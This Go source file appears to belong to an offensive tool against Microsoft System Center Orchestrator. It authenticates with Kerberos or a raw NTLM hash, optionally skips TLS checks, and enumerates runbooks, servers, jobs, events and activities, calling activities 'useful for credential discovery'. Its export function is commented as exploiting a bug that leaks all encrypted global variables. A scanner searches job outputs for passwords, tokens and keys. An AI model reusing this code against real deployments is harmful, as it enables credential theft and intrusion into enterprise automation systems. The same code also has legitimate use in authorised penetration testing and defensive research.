package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"scorch-tools/internal/auth"
)

// HTTPClient handles authenticated HTTP requests to SCORCH
type HTTPClient struct {
	opts       *CommonOpts
	httpClient *http.Client
	baseURL    string
	apiVersion string // "legacy" or "modern"
}

// KerberosTransport wraps an http.RoundTripper with Kerberos authentication
type KerberosTransport struct {
	Transport    http.RoundTripper
	KerbClient   *auth.KerberosClient
}

// RoundTrip implements http.RoundTripper
func (k *KerberosTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	// Get SPNEGO token for the target host
	host := req.URL.Hostname()
	token, err := k.KerbClient.GetSPNEGOToken(host)
	if err != nil {
		return nil, fmt.Errorf("failed to get Kerberos token: %w", err)
	}

	// Clone request and add Authorization header
	authReq := req.Clone(req.Context())
	authReq.Header.Set("Authorization", "Negotiate "+token)

	return k.Transport.RoundTrip(authReq)
}

// NewHTTPClient creates a new authenticated HTTP client
func NewHTTPClient(opts *CommonOpts) (*HTTPClient, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: opts.SkipVerify,
		},
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: false,
		DisableKeepAlives:  false,
	}

	var roundTripper http.RoundTripper = transport

	// Wrap with Kerberos if enabled
	if opts.Kerberos {
		kerbClient, err := createKerberosClient(opts)
		if err != nil {
			return nil, fmt.Errorf("Kerberos initialization failed: %w", err)
		}
		roundTripper = &KerberosTransport{
			Transport:  transport,
			KerbClient: kerbClient,
		}
	} else if opts.Domain != "" && opts.Username != "" && (opts.Password != "" || opts.NTHash != "") {
		// Wrap with NTLM if we have domain credentials or hash
		ntlmAuth := &NTLMAuth{
			Domain:   opts.Domain,
			User:     opts.Username,
			Password: opts.Password,
			Hash:     opts.NTHash,
			Debug:    opts.Debug,
		}
		roundTripper = &NTLMHashTransport{
			Transport: transport,
			Auth:      ntlmAuth,
		}
	}

	client := &http.Client{
		Transport: roundTripper,
		Timeout:   opts.Timeout,
	}

	return &HTTPClient{
		opts:       opts,
		httpClient: client,
		baseURL:    opts.BaseURL(),
	}, nil
}

// createKerberosClient creates a Kerberos client from options
func createKerberosClient(opts *CommonOpts) (*auth.KerberosClient, error) {
	cfg := &auth.KerberosConfig{
		Username:   opts.Username,
		Password:   opts.Password,
		Realm:      opts.Realm,
		KDCAddress: opts.KDC,
		Keytab:     opts.Keytab,
		CCache:     opts.CCache,
	}

	// Default realm to uppercase domain if not specified
	if cfg.Realm == "" && opts.Domain != "" {
		cfg.Realm = strings.ToUpper(opts.Domain)
	}

	// Check for ccache from environment if not specified
	if cfg.CCache == "" {
		if ccache := os.Getenv("KRB5CCNAME"); ccache != "" {
			cfg.CCache = strings.TrimPrefix(ccache, "FILE:")
		}
	}

	return auth.NewKerberosClient(cfg)
}

// DetectAPIVersion determines if this is legacy OData or modern JSON API
func (c *HTTPClient) DetectAPIVersion(ctx context.Context) (string, error) {
	// Try modern API first
	modernURL := c.baseURL + "/api/"
	req, _ := http.NewRequestWithContext(ctx, "GET", modernURL, nil)
	c.setBasicAuth(req)
	
	resp, err := c.httpClient.Do(req)
	if err == nil {
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusUnauthorized {
			// Check for JSON response indicators
			ct := resp.Header.Get("Content-Type")
			if strings.Contains(ct, "json") {
				c.apiVersion = "modern"
				return "Modern (JSON)", nil
			}
		}
	}

	// Try legacy OData
	legacyURL := c.baseURL + "/Orchestrator2012/Orchestrator.svc/"
	req, _ = http.NewRequestWithContext(ctx, "GET", legacyURL, nil)
	c.setBasicAuth(req)
	
	resp, err = c.httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("connection failed: %w", err)
	}
	defer resp.Body.Close()
	
	c.apiVersion = "legacy"
	return "Legacy (OData)", nil
}

// setBasicAuth sets basic auth if using non-NTLM credentials
func (c *HTTPClient) setBasicAuth(req *http.Request) {
	if c.opts.Username != "" && c.opts.Password != "" && c.opts.Domain == "" {
		req.SetBasicAuth(c.opts.Username, c.opts.Password)
	}
}

// doRequest performs an authenticated request
func (c *HTTPClient) doRequest(ctx context.Context, method, path string, body []byte) (*http.Response, error) {
	url := c.baseURL + path
	
	var bodyReader io.Reader
	if body != nil {
		bodyReader = bytes.NewReader(body)
	}
	
	req, err := http.NewRequestWithContext(ctx, method, url, bodyReader)
	if err != nil {
		return nil, err
	}
	
	// Set headers
	req.Header.Set("Accept", "application/json")
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	
	c.setBasicAuth(req)
	
	return c.httpClient.Do(req)
}

// API Data Types

type Runbook struct {
	ID          string `json:"Id"`
	Name        string `json:"Name"`
	Description string `json:"Description"`
	Path        string `json:"Path"`
	Published   bool   `json:"IsPublished"`
	FolderID    string `json:"FolderId"`
}

type RunbookParameter struct {
	ID        string `json:"Id"`
	Name      string `json:"Name"`
	Type      string `json:"Type"`
	Direction string `json:"Direction"`
	RunbookID string `json:"RunbookId"`
}

type RunbookServer struct {
	ID          string `json:"Id"`
	Name        string `json:"Name"`
	MachineName string `json:"MachineName"`
	Available   bool   `json:"IsOnline"`
}

type Folder struct {
	ID          string `json:"Id"`
	Name        string `json:"Name"`
	ParentID    string `json:"ParentId"`
	Description string `json:"Description"`
}

type Job struct {
	ID         string `json:"Id"`
	RunbookID  string `json:"RunbookId"`
	Status     string `json:"Status"`
	CreatedBy  string `json:"CreatedBy"`
	CreatedOn  string `json:"CreationTime"`
}

type EnumerationResult struct {
	Timestamp      string          `json:"timestamp"`
	Target         string          `json:"target"`
	APIVersion     string          `json:"api_version"`
	Runbooks       []Runbook       `json:"runbooks,omitempty"`
	RunbookServers []RunbookServer `json:"runbook_servers,omitempty"`
	Folders        []Folder        `json:"folders,omitempty"`
	Jobs           []Job           `json:"jobs,omitempty"`
	Activities     []Activity      `json:"activities,omitempty"`
}

// API Methods

func (c *HTTPClient) GetRunbooks(ctx context.Context) ([]Runbook, error) {
	var path string
	if c.apiVersion == "modern" {
		path = "/api/runbooks"
	} else {
		path = "/Orchestrator2012/Orchestrator.svc/Runbooks"
	}
	
	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, truncate(string(body), 100))
	}
	
	// Try JSON first
	var result struct {
		Value []Runbook `json:"value"`
	}
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	if err := json.Unmarshal(body, &result); err == nil && len(result.Value) > 0 {
		return result.Value, nil
	}
	
	// Try parsing as OData XML
	return c.parseODataRunbooks(body)
}

func (c *HTTPClient) parseODataRunbooks(data []byte) ([]Runbook, error) {
	// OData XML response structure
	type Entry struct {
		Content struct {
			Properties struct {
				ID          string `xml:"Id"`
				Name        string `xml:"Name"`
				Description string `xml:"Description"`
				Path        string `xml:"Path"`
				IsPublished bool   `xml:"IsPublished"`
			} `xml:"properties"`
		} `xml:"content"`
	}
	type Feed struct {
		Entries []Entry `xml:"entry"`
	}
	
	var feed Feed
	if err := xml.Unmarshal(data, &feed); err != nil {
		return nil, fmt.Errorf("failed to parse response: %w", err)
	}
	
	runbooks := make([]Runbook, len(feed.Entries))
	for i, e := range feed.Entries {
		runbooks[i] = Runbook{
			ID:          e.Content.Properties.ID,
			Name:        e.Content.Properties.Name,
			Description: e.Content.Properties.Description,
			Path:        e.Content.Properties.Path,
			Published:   e.Content.Properties.IsPublished,
		}
	}
	
	return runbooks, nil
}

func (c *HTTPClient) GetRunbook(ctx context.Context, id string) (*Runbook, error) {
	var path string
	if c.apiVersion == "modern" {
		path = fmt.Sprintf("/api/runbooks/%s", id)
	} else {
		path = fmt.Sprintf("/Orchestrator2012/Orchestrator.svc/Runbooks(guid'%s')", id)
	}
	
	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	
	var rb Runbook
	if err := json.NewDecoder(resp.Body).Decode(&rb); err != nil {
		return nil, err
	}
	
	return &rb, nil
}

func (c *HTTPClient) GetRunbookParameters(ctx context.Context, runbookID string) ([]RunbookParameter, error) {
	var path string
	if c.apiVersion == "modern" {
		path = fmt.Sprintf("/api/runbooks/%s/parameters", runbookID)
	} else {
		path = fmt.Sprintf("/Orchestrator2012/Orchestrator.svc/Runbooks(guid'%s')/Parameters", runbookID)
	}
	
	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	
	var result struct {
		Value []RunbookParameter `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}
	
	return result.Value, nil
}

func (c *HTTPClient) SearchRunbooks(ctx context.Context, query string) ([]Runbook, error) {
	runbooks, err := c.GetRunbooks(ctx)
	if err != nil {
		return nil, err
	}
	
	query = strings.ToLower(query)
	var results []Runbook
	for _, rb := range runbooks {
		if strings.Contains(strings.ToLower(rb.Name), query) ||
			strings.Contains(strings.ToLower(rb.Description), query) {
			results = append(results, rb)
		}
	}
	
	return results, nil
}

func (c *HTTPClient) GetRunbookServers(ctx context.Context) ([]RunbookServer, error) {
	var path string
	if c.apiVersion == "modern" {
		path = "/api/runbookservers"
	} else {
		path = "/Orchestrator2012/Orchestrator.svc/RunbookServers"
	}
	
	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	
	var result struct {
		Value []RunbookServer `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}
	
	return result.Value, nil
}

func (c *HTTPClient) GetFolders(ctx context.Context) ([]Folder, error) {
	var path string
	if c.apiVersion == "modern" {
		path = "/api/folders"
	} else {
		path = "/Orchestrator2012/Orchestrator.svc/Folders"
	}
	
	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	
	var result struct {
		Value []Folder `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}
	
	return result.Value, nil
}

func (c *HTTPClient) GetJobs(ctx context.Context, filter string) ([]Job, error) {
	var path string
	if c.apiVersion == "modern" {
		path = "/api/jobs"
	} else {
		path = "/Orchestrator2012/Orchestrator.svc/Jobs"
	}

	if filter != "" {
		path += "?$filter=" + filter
	}

	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	var result struct {
		Value []Job `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	return result.Value, nil
}

// Activity represents a SCORCH activity within a runbook
type Activity struct {
	ID          string `json:"Id"`
	RunbookID   string `json:"RunbookId"`
	Name        string `json:"Name"`
	Type        string `json:"Type"`
	Description string `json:"Description"`
}

// Event represents a SCORCH system event
type Event struct {
	ID          string `json:"Id"`
	Name        string `json:"Name"`
	Summary     string `json:"Summary"`
	Details     string `json:"Details"`
	Severity    string `json:"Severity"`
	Source      string `json:"Source"`
	CreatedTime string `json:"CreationTime"`
}

// JobInstance represents a specific execution instance of a job
type JobInstance struct {
	ID        string `json:"Id"`
	JobID     string `json:"JobId"`
	Status    string `json:"Status"`
	StartTime string `json:"StartTime"`
	EndTime   string `json:"EndTime"`
	Output    string `json:"Output"`
}

// Statistics represents SCORCH execution statistics
type Statistics struct {
	TotalJobs       int `json:"TotalJobs"`
	RunningJobs     int `json:"RunningJobs"`
	CompletedJobs   int `json:"CompletedJobs"`
	FailedJobs      int `json:"FailedJobs"`
	TotalRunbooks   int `json:"TotalRunbooks"`
	PublishedCount  int `json:"PublishedRunbooks"`
}

// GetActivities returns all activities (useful for credential discovery)
func (c *HTTPClient) GetActivities(ctx context.Context) ([]Activity, error) {
	var path string
	if c.apiVersion == "modern" {
		path = "/api/activities"
	} else {
		path = "/Orchestrator2012/Orchestrator.svc/Activities"
	}

	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	var result struct {
		Value []Activity `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	return result.Value, nil
}

// GetRunbookActivities returns activities for a specific runbook
func (c *HTTPClient) GetRunbookActivities(ctx context.Context, runbookID string) ([]Activity, error) {
	var path string
	if c.apiVersion == "modern" {
		path = fmt.Sprintf("/api/runbooks/%s/activities", runbookID)
	} else {
		path = fmt.Sprintf("/Orchestrator2012/Orchestrator.svc/Runbooks(guid'%s')/Activities", runbookID)
	}

	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	var result struct {
		Value []Activity `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	return result.Value, nil
}

// GetEvents returns system events (audit log)
func (c *HTTPClient) GetEvents(ctx context.Context, filter string) ([]Event, error) {
	var path string
	if c.apiVersion == "modern" {
		path = "/api/events"
	} else {
		path = "/Orchestrator2012/Orchestrator.svc/Events"
	}

	if filter != "" {
		path += "?$filter=" + filter
	}

	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d (events may not be accessible)", resp.StatusCode)
	}

	var result struct {
		Value []Event `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	return result.Value, nil
}

// GetJobInstances returns execution instances for a job (contains output)
func (c *HTTPClient) GetJobInstances(ctx context.Context, jobID string) ([]JobInstance, error) {
	var path string
	if c.apiVersion == "modern" {
		path = fmt.Sprintf("/api/jobs/%s/instances", jobID)
	} else {
		path = fmt.Sprintf("/Orchestrator2012/Orchestrator.svc/Jobs(guid'%s')/Instances", jobID)
	}

	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	var result struct {
		Value []JobInstance `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	return result.Value, nil
}

// GetStatistics returns execution statistics
func (c *HTTPClient) GetStatistics(ctx context.Context) (*Statistics, error) {
	var path string
	if c.apiVersion == "modern" {
		path = "/api/statistics"
	} else {
		path = "/Orchestrator2012/Orchestrator.svc/Statistics"
	}

	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d (statistics may not be accessible)", resp.StatusCode)
	}

	var stats Statistics
	if err := json.NewDecoder(resp.Body).Decode(&stats); err != nil {
		return nil, err
	}

	return &stats, nil
}

// ExportRunbook exports a runbook definition
// NOTE: This exploits a bug where ALL encrypted global variables are included in export!
func (c *HTTPClient) ExportRunbook(ctx context.Context, runbookID string) ([]byte, error) {
	var path string
	if c.apiVersion == "modern" {
		path = fmt.Sprintf("/api/runbooks/%s/export", runbookID)
	} else {
		// Legacy API - try $export operation
		path = fmt.Sprintf("/Orchestrator2012/Orchestrator.svc/Runbooks(guid'%s')/$export", runbookID)
	}

	resp, err := c.doRequest(ctx, "GET", path, nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d (export may require Operators role or higher)", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

// ScanJobOutputsForCredentials scans job outputs for credential patterns
func (c *HTTPClient) ScanJobOutputsForCredentials(ctx context.Context) ([]CredentialLeak, error) {
	jobs, err := c.GetJobs(ctx, "")
	if err != nil {
		return nil, err
	}

	var leaks []CredentialLeak
	patterns := []string{
		"password", "secret", "credential", "apikey", "api_key",
		"token", "bearer", "connectionstring", "private_key",
	}

	for _, job := range jobs {
		instances, err := c.GetJobInstances(ctx, job.ID)
		if err != nil {
			continue
		}

		for _, inst := range instances {
			lower := strings.ToLower(inst.Output)
			for _, pattern := range patterns {
				if strings.Contains(lower, pattern) {
					leaks = append(leaks, CredentialLeak{
						JobID:     job.ID,
						Pattern:   pattern,
						Snippet:   extractSnippet(inst.Output, pattern),
						Timestamp: inst.EndTime,
					})
				}
			}
		}
	}

	return leaks, nil
}

// CredentialLeak represents a potential credential leak in job output
type CredentialLeak struct {
	JobID     string `json:"job_id"`
	Pattern   string `json:"pattern"`
	Snippet   string `json:"snippet"`
	Timestamp string `json:"timestamp"`
}

// extractSnippet extracts context around a pattern match
func extractSnippet(text, pattern string) string {
	lower := strings.ToLower(text)
	idx := strings.Index(lower, pattern)
	if idx == -1 {
		return ""
	}

	start := idx - 30
	if start < 0 {
		start = 0
	}
	end := idx + len(pattern) + 50
	if end > len(text) {
		end = len(text)
	}

	return "..." + text[start:end] + "..."
}
